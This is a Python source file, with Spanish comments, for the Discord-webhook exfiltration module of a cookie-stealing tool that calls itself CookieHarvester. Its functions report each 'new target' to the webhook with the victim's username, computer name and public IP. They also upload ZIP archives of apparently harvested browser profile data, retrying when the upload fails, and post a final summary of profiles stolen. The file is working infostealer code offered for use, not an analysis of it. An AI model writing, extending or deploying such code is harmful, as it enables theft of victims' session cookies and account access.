#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
transport/discord.py
- Implementación del transporte Discord vía webhook.
- Contiene toda la lógica de envío, reintentos y logs.
- Es una traducción fiel de las funciones originales:
  info_objetivo, enviar_a_discord y enviar_resumen_final.
"""

import os
import time
import traceback
import requests

from .base import Transport


class DiscordTransport(Transport):
    """
    Transporte Discord.
    Envía texto y archivos a un webhook.
    """

    def __init__(self, webhook_url):
        if not webhook_url:
            raise ValueError("Falta DISCORD_WEBHOOK_URL")
        self.webhook_url = webhook_url

    # ============================================================
    # Envía mensajes a Discord y retorna True/False según éxito.
    # MUESTRA TODOS LOS LOGS DETALLADOS.
    # ============================================================
    def info_objetivo(self, VERSION, usuario, equipo, ip_publica, fecha, errores):
        """
        Envía un mensaje de "objetivo nuevo" a Discord.
        Retorna True si se envió correctamente (status 200 o 204).
        """
        try:
            print("\n[DEBUG] === INFO_OBJETIVO ===")
            print(f"[DEBUG] Usuario: {usuario}")
            print(f"[DEBUG] Equipo: {equipo}")
            print(f"[DEBUG] IP: {ip_publica}")

            resumen = f"""
===================================================
CookieHarvester {VERSION} tiene un objetivo nuevo
===================================================
-----------------------------
Informacion del dispositivo
-----------------------------
Usuario: {usuario}
Equipo: {equipo}
IP: {ip_publica}
Fecha: {fecha}
Errores hasta ahora: {'Sí' if errores else 'No'}
"""
            print(f"[DEBUG] Mensaje (primeros 100 chars): {resumen[:100].replace(chr(10), ' ')}...")

            print("[DEBUG] Enviando POST a Discord...")
            response = requests.post(self.webhook_url, data={'content': resumen[:1900]}, timeout=10)

            print(f"[DEBUG] Código de respuesta: {response.status_code}")
            print(f"[DEBUG] Respuesta del servidor: {response.text[:200]}")

            if response.status_code in [200, 204]:
                print("[DEBUG] Mensaje 'objetivo nuevo' enviado correctamente")
                return True
            else:
                print(f"[DEBUG] Fallo de respuesta con código {response.status_code}")
                return False

        except Exception as e:
            print(f"[!] ERROR en info_objetivo: {e}")
            print(f"[!] Tipo de error: {type(e).__name__}")
            traceback.print_exc()
            return False

    # ============================================================
    # Envía un archivo ZIP a Discord con reintentos.
    # ============================================================
    def enviar_a_discord(self, zip_path, caption=None, intento=1, max_intentos=3):
        """
        Envía un archivo ZIP a Discord con reintentos.
        Retorna True si se envió correctamente.
        """
        try:
            print(f"\n[DEBUG] === ENVIAR_A_DISCORD (Intento {intento}/{max_intentos}) ===")
            print(f"[DEBUG] Archivo: {zip_path}")
            print(f"[DEBUG] Caption: {caption[:60] if caption else 'None'}...")

            if not os.path.exists(zip_path):
                print(f"[!] ERROR: El archivo {zip_path} NO EXISTE")
                return False

            file_size = os.path.getsize(zip_path)
            print(f"[DEBUG] Tamaño: {file_size} bytes ({file_size/1024/1024:.2f} MB)")

            with open(zip_path, 'rb') as f:
                files = {'file': (os.path.basename(zip_path), f, 'application/zip')}
                data = {}
                if caption:
                    data['content'] = caption[:1000]

                print("[DEBUG] Enviando POST con archivo...")
                response = requests.post(
                    self.webhook_url, files=files, data=data, timeout=30
                )  # Aumentele el timeout si desea.

                print(f"[DEBUG] Código de respuesta: {response.status_code}")
                print(f"[DEBUG] Respuesta del servidor: {response.text[:200]}")

                if response.status_code in [200, 204]:
                    print("[DEBUG] Archivo enviado correctamente")
                    return True
                elif response.status_code == 429:
                    print("[DEBUG] Rate limit (429)")
                    if intento < max_intentos:
                        wait_time = 2 ** intento  # Aumente el wait_time si lo desea.
                        print(f"[DEBUG] Esperando {wait_time}s...")
                        time.sleep(wait_time)
                        return self.enviar_a_discord(
                            zip_path, caption, intento+1, max_intentos
                        )
                    return False
                else:
                    print(f"[DEBUG] Falló de envio con código {response.status_code}")
                    if intento < max_intentos:
                        wait_time = 2 ** intento
                        print(f"[DEBUG] Reintentando en {wait_time}s...")
                        time.sleep(wait_time)
                        return self.enviar_a_discord(
                            zip_path, caption, intento+1, max_intentos
                        )
                    return False

        except Exception as e:
            print(f"[!] ERROR en enviar_a_discord: {e}")
            print(f"[!] Tipo de error: {type(e).__name__}")
            traceback.print_exc()

            if intento < max_intentos:
                wait_time = 2 ** intento
                print(f"[DEBUG] Reintentando en {wait_time}s...")
                time.sleep(wait_time)
                return self.enviar_a_discord(
                    zip_path, caption, intento+1, max_intentos
                )
            return False

    # ============================================================
    # Envía el resumen final de ejecución a Discord.
    # ============================================================
    def enviar_resumen_final(self, info_objetivo_dict, perfiles_procesados,
                             total_partes_enviadas, errores):
        """
        Envía el resumen final de ejecución a Discord.
        Retorna True si se envió correctamente.
        """
        try:
            print("\n[DEBUG] === ENVIAR_RESUMEN_FINAL ===")
            print(f"[DEBUG] Usuario: {info_objetivo_dict.get('usuario', 'N/A')}")
            print(f"[DEBUG] Perfiles procesados: {len(perfiles_procesados)}")
            print(f"[DEBUG] Partes enviadas: {total_partes_enviadas}")
            print(f"[DEBUG] Errores: {errores}")

            resumen = f"""
===================================================
RESUMEN DE EJECUCIÓN
===================================================
Usuario: {info_objetivo_dict['usuario']}
Equipo: {info_objetivo_dict['equipo']}
IP: {info_objetivo_dict['ip_publica']}
Fecha: {info_objetivo_dict['fecha']}
Perfiles: {len(perfiles_procesados)}
Partes enviadas: {total_partes_enviadas}
Errores: {'Sí' if errores else 'No'}
"""
            print(f"[DEBUG] Mensaje (primeros 100 chars): {resumen[:100].replace(chr(10), ' ')}...")

            print("[DEBUG] Enviando POST...")
            response = requests.post(self.webhook_url, data={'content': resumen[:1900]}, timeout=10)

            print(f"[DEBUG] Código de respuesta: {response.status_code}")
            print(f"[DEBUG] Respuesta: {response.text[:200]}")

            if response.status_code in [200, 204]:
                print("[DEBUG] Resumen final enviado")
                return True
            else:
                print(f"[DEBUG] Falló con código {response.status_code}")
                return False

        except Exception as e:
            print(f"[!] ERROR en enviar_resumen_final: {e}")
            print(f"[!] Tipo de error: {type(e).__name__}")
            traceback.print_exc()
            return False

    # ============================================================
    # Implementación del contrato Transport.
    # ============================================================
    def send_text(self, texto: str) -> bool:
        """Envía un mensaje de texto simple (usado como resumen)."""
        try:
            response = requests.post(
                self.webhook_url, data={'content': texto[:1900]}, timeout=10
            )
            return response.status_code in [200, 204]
        except Exception as e:
            print(f"[!] ERROR send_text: {e}")
            return False

    def send_file(self, filepath: str, caption: str = None,
                  intento: int = 1, max_intentos: int = 3) -> bool:
        """Delegado a enviar_a_discord."""
        return self.enviar_a_discord(filepath, caption, intento, max_intentos)

    def send_summary(self, resumen: str) -> bool:
        """Delegado a send_text."""
        return self.send_text(resumen)